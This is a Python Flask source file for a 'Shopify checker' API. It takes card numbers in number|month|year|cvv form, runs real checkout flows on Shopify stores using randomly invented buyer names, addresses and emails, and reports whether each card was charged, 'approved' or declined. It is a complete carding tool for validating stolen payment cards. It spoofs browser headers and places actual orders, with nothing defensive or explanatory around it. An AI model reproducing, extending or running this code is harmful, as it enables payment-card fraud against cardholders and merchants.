#!/usr/bin/env python3
"""
SHOPIFY CHECKER API — FULL WORKING VERSION
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import json
import re
import random
import time
import uuid
import os
import requests
from urllib.parse import urlparse
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ============================================================
# LOAD SITES
# ============================================================

SITES_FILE = "sites.txt"
SITES = []

def load_sites():
    global SITES
    SITES = []
    if os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                site = line.strip()
                if site and not site.startswith('#'):
                    site = re.sub(r'^https?://', '', site)
                    site = site.rstrip('/')
                    SITES.append(site)
    if not SITES:
        SITES = ["gravebeforeshaveshop.myshopify.com"]
    print(f"🌍 Loaded {len(SITES)} sites")

def get_random_site():
    return random.choice(SITES) if SITES else "gravebeforeshaveshop.myshopify.com"

load_sites()

# ============================================================
# RESPONSE MAPPING
# ============================================================

RESPONSE_MAP = {
    "CHARGED": "𝘾𝙝𝙖𝙧𝙜𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: ORDER_PLACED",
    "APPROVED": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INSUFFICIENT_FUNDS",
    "INCORRECT_CVC": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: INCORRECT_CVC",
    "OTP_REQUIRED": "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: OTP_REQUIRED",
    "DECLINED": "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: CARD_DECLINED",
}

# ============================================================
# USER AGENTS
# ============================================================

_UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
]

_CH_UA_POOL = [
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
]

def _rand_ua():       return random.choice(_UA_POOL)
def _rand_ch_ua():    return random.choice(_CH_UA_POOL)
def _rand_platform(): return random.choice(['"Windows"', '"macOS"'])

# ============================================================
# SHOPIFY CHECKER — SIMPLIFIED WORKING VERSION
# ============================================================

class ShopifyChecker:
    def __init__(self, base_url):
        self.session = requests.Session()
        self.base_url = base_url.rstrip('/')
        self.headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': _rand_ua(),
            'sec-ch-ua': _rand_ch_ua(),
            'sec-ch-ua-platform': _rand_platform(),
        }
        self.variant_id = None
        self.cart_token = None
        self.checkout_id = None
        self.session_token = None
        self.queue_token = None
        self.stable_id = None
        self.payment_method_identifier = None
        self.signature = None
        self.pci_build_hash = 'a8e4a94'
        self.build_id = '4663384ede457d59be87980de7797171b19f2a1b'
        self.signed_handles = []

    def get_random_address(self):
        first_names = ["James","Mary","Robert","Patricia","John","Jennifer"]
        last_names = ["Smith","Jones","Taylor","Brown","Williams","Wilson"]
        streets = ["Maple St","Oak Ave","Washington Blvd","Lakeview Dr"]
        cities = [
            ("New York","NY","10001"), ("Los Angeles","CA","90001"),
            ("Houston","TX","77001"), ("Chicago","IL","60601"),
        ]
        fn = random.choice(first_names)
        ln = random.choice(last_names)
        street = f"{random.randint(100,9999)} {random.choice(streets)}"
        city, state, zp = random.choice(cities)
        return {
            "firstName": fn, "lastName": ln,
            "address1": street, "city": city,
            "zoneCode": state, "postalCode": zp,
            "countryCode": "US",
            "phone": f"+1703{random.randint(210,999)}{random.randint(1000,9999)}",
            "company": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=5))
        }

    def get_initial_session(self):
        try:
            r = self.session.get(f"https://{self.base_url}/cart.js", headers=self.headers, timeout=15)
            if r.status_code not in (200, 302):
                return False
            try:
                cart_data = r.json() if r.status_code == 200 else {}
            except:
                cart_data = {}
            self.cart_token = cart_data.get('token', '')
            return True
        except:
            return False

    def find_product(self):
        try:
            r = self.session.get(f"https://{self.base_url}/products.json", headers=self.headers, timeout=15)
            if r.status_code != 200:
                return False
            products = r.json().get('products', [])
            for p in products:
                for v in p['variants']:
                    if v.get('available'):
                        self.variant_id = v['id']
                        return True
            return False
        except:
            return False

    def add_to_cart(self):
        url = f"https://{self.base_url}/cart/add.js"
        headers = self.headers.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['origin'] = f"https://{self.base_url}"
        data = {'id': self.variant_id, 'quantity': 1}
        try:
            r = self.session.post(url, data=data, headers=headers, timeout=15)
            if r.status_code == 200:
                self.cart_token = r.json().get('cart_token', '')
                return True
            return False
        except:
            return False

    def start_checkout(self):
        url = f"https://{self.base_url}/cart"
        headers = self.headers.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['origin'] = f"https://{self.base_url}"
        headers['referer'] = f"https://{self.base_url}/cart"
        data = f'updates%5B%5D=1&checkout=&cart_token={self.cart_token or ""}'
        try:
            r = self.session.post(url, data=data, headers=headers, allow_redirects=True, timeout=20)
            self.checkout_url = r.url
            match = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9]+)', self.checkout_url)
            if match:
                self.checkout_id = match.group(1)
                return True
            return False
        except:
            return False

    def get_checkout_metadata(self):
        try:
            r = self.session.get(self.checkout_url, headers=self.headers, timeout=20)
            html = r.text
        except:
            return False

        m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
        self.session_token = m.group(1) if m else None

        if not self.session_token:
            m = re.search(r'"sessionToken"\s*:\s*"(AAEB[^"]+)"', html)
            self.session_token = m.group(1) if m else None

        m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
        self.queue_token = m.group(1) if m else None

        m = re.search(r'stableId&quot;:&quot;([^&]+)&quot;', html)
        self.stable_id = m.group(1) if m else str(uuid.uuid4())

        m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
        self.payment_method_identifier = m.group(1) if m else None

        m = re.search(r'identificationSignature"\s*:\s*"(eyJ[^"]+)"', html)
        self.signature = m.group(1) if m else None

        self.signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', html)

        return bool(self.session_token)

    def vault_card(self, cc_details):
        parts = cc_details.strip().split('|')
        if len(parts) != 4:
            return None
        card_num, month, year, cvv = parts
        address = self.get_random_address()
        url = "https://checkout.pci.shopifyinc.com/sessions"
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'user-agent': self.headers.get('user-agent'),
            'shopify-identification-signature': self.signature or '',
        }
        payload = {
            "credit_card": {
                "number": card_num.strip(),
                "month": int(month.strip()),
                "year": int(year.strip()),
                "verification_value": cvv.strip(),
                "name": f"{address['firstName']} {address['lastName']}"
            },
            "payment_session_scope": self.base_url
        }
        try:
            r = self.session.post(url, json=payload, headers=headers, timeout=20)
            if r.status_code in (200, 201):
                return r.json().get('id')
            return None
        except:
            return None

    def submit_payment(self, vault_id, address, cc_details):
        if not self.session_token:
            return None

        url = f"https://{self.base_url}/checkouts/unstable/graphql"
        headers = self.headers.copy()
        headers['accept'] = 'application/json'
        headers['content-type'] = 'application/json'
        headers['origin'] = f"https://{self.base_url}"
        headers['x-checkout-one-session-token'] = self.session_token
        headers['x-checkout-web-source-id'] = self.checkout_id
        headers['x-checkout-web-build-id'] = self.build_id
        headers['x-checkout-web-deploy-stage'] = 'production'
        headers['shopify-checkout-source'] = f'id="{self.checkout_id}", type="cn"'

        # Extract card number for BIN
        card_number = cc_details.split('|')[0].strip()
        card_bin = card_number[:8] if len(card_number) >= 8 else card_number

        buyer_email = f"{address['firstName'].lower()}{random.randint(10,99)}@gmail.com"

        MUTATION = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitRejected{errors{code __typename}__typename}...on Throttled{pollAfter queueToken __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

        payload = {
            "query": MUTATION,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": f"{self.checkout_id}-{random.randint(100000,999999)}",
                "analytics": {"requestUrl": self.checkout_url},
                "input": {
                    "sessionInput": {"sessionToken": self.session_token},
                    "queueToken": self.queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": address['address1'],
                                    "address2": "",
                                    "city": address['city'],
                                    "countryCode": address['countryCode'],
                                    "postalCode": address['postalCode'],
                                    "firstName": address['firstName'],
                                    "lastName": address['lastName'],
                                    "zoneCode": address['zoneCode'],
                                    "phone": address['phone']
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                },
                                "options": {"phone": address['phone']}
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True}
                        }],
                        "noDeliveryRequired": []
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": self.stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{self.variant_id}"
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True}
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": self.payment_method_identifier,
                                    "sessionId": vault_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": address['address1'],
                                            "address2": "",
                                            "city": address['city'],
                                            "countryCode": address['countryCode'],
                                            "postalCode": address['postalCode'],
                                            "firstName": address['firstName'],
                                            "lastName": address['lastName'],
                                            "zoneCode": address['zoneCode'],
                                            "phone": address['phone']
                                        }
                                    }
                                }
                            },
                            "amount": {"any": True}
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": address['address1'],
                                "address2": "",
                                "city": address['city'],
                                "countryCode": address['countryCode'],
                                "postalCode": address['postalCode'],
                                "firstName": address['firstName'],
                                "lastName": address['lastName'],
                                "zoneCode": address['zoneCode'],
                                "phone": address['phone']
                            }
                        },
                        "creditCardBin": card_bin
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                        "email": buyer_email,
                        "phoneCountryCode": "US",
                        "marketingConsent": [{"email": {"consentState": "GRANTED", "value": buyer_email}}],
                        "shopPayOptInPhone": {"number": address['phone'], "countryCode": "US"}
                    },
                    "taxes": {"proposedTotalAmount": {"any": True}},
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []}
                }
            }
        }

        try:
            r = self.session.post(url, json=payload, headers=headers, timeout=30)
            data = r.json()
            submit = data.get('data', {}).get('submitForCompletion', {})
            typename = submit.get('__typename', '')

            if typename in ('SubmitSuccess', 'SubmittedForCompletion'):
                receipt = submit.get('receipt', {})
                return receipt.get('id')

            elif typename == 'SubmitRejected':
                errors = submit.get('errors', [])
                for error in errors:
                    code = error.get('code', '')
                    if 'INSUFFICIENT_FUNDS' in code:
                        return "APPROVED_INSUFFICIENT"
                    if 'CVC' in code or 'CVV' in code:
                        return "APPROVED_CVC"
                    if 'OTP' in code or '3D' in code:
                        return "APPROVED_OTP"
                return None

            elif typename == 'Throttled':
                return None

            return None
        except:
            return None

    def poll_receipt(self, receipt_id):
        url = f"https://{self.base_url}/checkouts/unstable/graphql"
        headers = self.headers.copy()
        headers['accept'] = 'application/json'
        headers['content-type'] = 'application/json'
        headers['x-checkout-one-session-token'] = self.session_token
        headers['x-checkout-web-source-id'] = self.checkout_id

        POLL_QUERY = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

        for _ in range(10):
            try:
                poll_payload = {
                    "query": POLL_QUERY,
                    "operationName": "PollForReceipt",
                    "variables": {
                        "receiptId": receipt_id,
                        "sessionToken": self.session_token
                    }
                }
                r = self.session.post(url, json=poll_payload, headers=headers, timeout=20)
                data = r.json()
                receipt = data.get('data', {}).get('receipt', {})
                tn = receipt.get('__typename', '')

                if tn == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                    return "CHARGED"

                if tn == 'ActionRequiredReceipt':
                    return "APPROVED_OTP"

                if tn == 'FailedReceipt':
                    err = receipt.get('processingError', {})
                    code = err.get('code', '')
                    if 'INSUFFICIENT_FUNDS' in code:
                        return "APPROVED_INSUFFICIENT"
                    if 'CVC' in code or 'CVV' in code:
                        return "APPROVED_CVC"
                    return "DECLINED"

                time.sleep(3)
            except:
                time.sleep(3)

        return "DECLINED"

    def check_card(self, cc_line, site=None):
        if site:
            self.base_url = site.rstrip('/')
        else:
            self.base_url = get_random_site()

        if not self.base_url.startswith('http'):
            self.base_url = 'https://' + self.base_url
        self.base_url = self.base_url.rstrip('/')

        if not self.get_initial_session():
            return ("ERROR", cc_line, "Session init failed", self.base_url)
        if not self.find_product():
            return ("ERROR", cc_line, "No product found", self.base_url)
        if not self.add_to_cart():
            return ("ERROR", cc_line, "Add to cart failed", self.base_url)
        if not self.start_checkout():
            return ("ERROR", cc_line, "Checkout start failed", self.base_url)
        if not self.get_checkout_metadata():
            return ("ERROR", cc_line, "Token extraction failed", self.base_url)

        address = self.get_random_address()
        vault_id = self.vault_card(cc_line)
        if not vault_id:
            return ("ERROR", cc_line, "Card vault failed", self.base_url)

        result = self.submit_payment(vault_id, address, cc_line)

        if result == "APPROVED_INSUFFICIENT":
            return ("APPROVED", cc_line, "INSUFFICIENT_FUNDS", self.base_url)
        if result == "APPROVED_CVC":
            return ("APPROVED", cc_line, "INCORRECT_CVC", self.base_url)
        if result == "APPROVED_OTP":
            return ("APPROVED", cc_line, "OTP_REQUIRED", self.base_url)
        if not result:
            return ("DECLINED", cc_line, "No receipt", self.base_url)

        poll_result = self.poll_receipt(result)

        if poll_result == "CHARGED":
            return ("CHARGED", cc_line, "ORDER_PLACED", self.base_url)
        elif poll_result == "APPROVED_INSUFFICIENT":
            return ("APPROVED", cc_line, "INSUFFICIENT_FUNDS", self.base_url)
        elif poll_result == "APPROVED_CVC":
            return ("APPROVED", cc_line, "INCORRECT_CVC", self.base_url)
        elif poll_result == "APPROVED_OTP":
            return ("APPROVED", cc_line, "OTP_REQUIRED", self.base_url)
        else:
            return ("DECLINED", cc_line, "CARD_DECLINED", self.base_url)

# ============================================================
# FORMAT RESPONSE
# ============================================================

def format_response(category, cc, detail, site):
    if category == "CHARGED":
        return {
            "Gateway": "Shopify",
            "Price": 0.0,
            "Response": RESPONSE_MAP["CHARGED"],
            "Status": True,
            "cc": cc,
            "Site": site,
            "Detail": detail
        }
    elif category == "APPROVED":
        if "OTP" in detail:
            return {
                "Gateway": "Shopify",
                "Price": 0.0,
                "Response": RESPONSE_MAP["OTP_REQUIRED"],
                "Status": True,
                "cc": cc,
                "Site": site,
                "Detail": detail
            }
        elif "CVC" in detail:
            return {
                "Gateway": "Shopify",
                "Price": 0.0,
                "Response": RESPONSE_MAP["INCORRECT_CVC"],
                "Status": True,
                "cc": cc,
                "Site": site,
                "Detail": detail
            }
        elif "INSUFFICIENT" in detail:
            return {
                "Gateway": "Shopify",
                "Price": 0.0,
                "Response": RESPONSE_MAP["APPROVED"],
                "Status": True,
                "cc": cc,
                "Site": site,
                "Detail": detail
            }
        else:
            return {
                "Gateway": "Shopify",
                "Price": 0.0,
                "Response": f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚: {detail[:30]}",
                "Status": True,
                "cc": cc,
                "Site": site,
                "Detail": detail
            }
    elif category == "DECLINED":
        return {
            "Gateway": "Shopify",
            "Price": 0.0,
            "Response": RESPONSE_MAP["DECLINED"],
            "Status": False,
            "cc": cc,
            "Site": site,
            "Detail": detail
            }
    else:
        return {
            "Gateway": "Shopify",
            "Price": 0.0,
            "Response": f"ERROR: {detail[:30]}",
            "Status": False,
            "cc": cc,
            "Site": site,
            "Detail": detail
        }

# ============================================================
# API ENDPOINTS
# ============================================================

@app.route('/', methods=['GET'])
def home():
    return jsonify({"status": "online", "version": "2.0"})

@app.route('/health', methods=['GET'])
def health():
    return "OK", 200

@app.route('/shopify', methods=['GET'])
def single_check():
    try:
        cc = request.args.get('cc')
        site = request.args.get('site')

        if not cc:
            return jsonify({"error": "Missing 'cc' parameter"}), 400

        if not site:
            site = get_random_site()

        checker = ShopifyChecker(site)
        category, cc_out, detail, used_site = checker.check_card(cc, site)

        response = format_response(category, cc_out, detail, used_site)
        return jsonify(response)

    except Exception as e:
        return jsonify({
            "Gateway": "Shopify",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "Status": False,
            "cc": request.args.get('cc', '')
        }), 500

# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    port = int(os.getenv('PORT', 8080))
    print("🔥 Shopify API running on port", port)
    app.run(host='0.0.0.0', port=port, debug=False)
